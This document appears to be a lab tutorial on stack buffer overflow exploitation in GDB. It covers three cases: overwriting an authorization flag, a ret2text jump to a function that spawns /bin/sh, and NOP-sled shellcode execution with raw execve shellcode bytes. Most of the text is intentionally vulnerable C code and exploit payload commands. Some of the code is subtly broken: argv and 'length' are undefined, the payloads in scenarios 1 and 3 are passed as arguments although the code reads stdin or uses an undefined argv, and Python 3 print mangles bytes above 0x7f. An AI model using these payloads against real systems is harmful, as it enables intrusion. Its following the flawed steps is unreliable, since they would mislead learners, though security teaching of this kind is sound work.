SCENARIO 1: OVERWRITING A LOCAL VARIABLE

Concept: A stack-based buffer overflow where input overflows a character array and corrupts an adjacent control variable (e.g., an authentication flag) in stack memory.

Vulnerable C Structure:
```
void function(void) {
int authorized = 0;
char buffer[64];
gets(buffer);
if (authorized != 0) {
grant_access();
}
}
```

GDB Commands and Execution:

1. Start GDB: gdb ./vulnerable_binary
2. Disassemble main or the target function: disas function
3. Set a breakpoint before input: break *function+24 (or at gets)
4. Run the program: run
5. Examine stack layout and variable addresses:
print &buffer
print &authorized
6. Calculate offset between buffer start and authorized variable.
7. Execute with payload overwriting the variable:
run $(python3 -c 'print("A" * 64 + "\x01\x00\x00\x00")')
8. Verify state change: info registers or print authorized

---

SCENARIO 2: OVERWRITING THE RETURN ADDRESS (RET2TEXT)

Concept: Overflowing a buffer beyond its allocated space to overwrite the saved frame pointer and the saved instruction pointer (return address), redirecting execution flow to an existing function (e.g., a hidden win function).

Vulnerable C Structure:
```
void win(void) {
system("/bin/sh");
}
void vuln(void) {
char buffer[32];
gets(buffer);
}
```

GDB Commands and Execution:

1. Load binary: gdb ./vulnerable_binary
2. Locate target function address: print win (or info function win)
3. Disassemble vulnerable function to find stack size: disas vuln
4. Identify offset to return address using pattern generation:
pattern create 60
run <generated_pattern>
info registers (observe RSP/ESP corruption value)
pattern search <faulty_address>
5. Construct exploit payload with target function address in little-endian format:
run $(python3 -c 'print("A" * 44 + "\x26\x11\x40\x00\x00\x00\x00\x00")')
6. Step instruction to verify execution jump: stepi or continue

---

SCENARIO 3: STACK SHELLCODE EXECUTION VIA NOP SLED

Concept: Injecting shellcode into a local buffer and redirecting the instruction pointer back onto the stack to execute arbitrary machine instructions, assisted by a NOP sled to increase reliability.

Vulnerable C Structure:
```
void vuln(void) {
char buffer[128];
strcpy(buffer, argv[1]);
}
```

GDB Commands and Execution:

1. Disable Address Space Layout Randomization (ASLR) in the operating system environment before testing.
2. Load binary in GDB: gdb ./vulnerable_binary
3. Set breakpoint at return instruction: break *vuln+50
4. Run with a test payload: run $(python3 -c 'print("\x90" * 64 + "\xcc" * 4 + "B" * 60)')
5. Inspect stack memory to find buffer location:
x/200xw $esp (or x/200xg$rsp)
6. Identify the exact address where the NOP sled begins.
7. Build the final exploit string containing NOP sled (\x90), shellcode bytes, and the target stack address replacing the return address:
run $(python3 -c 'print("\x90" * 32 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * (132 - length) + "<stack_address_pointer>")')
8. Continue execution to trigger shell spawn: continue
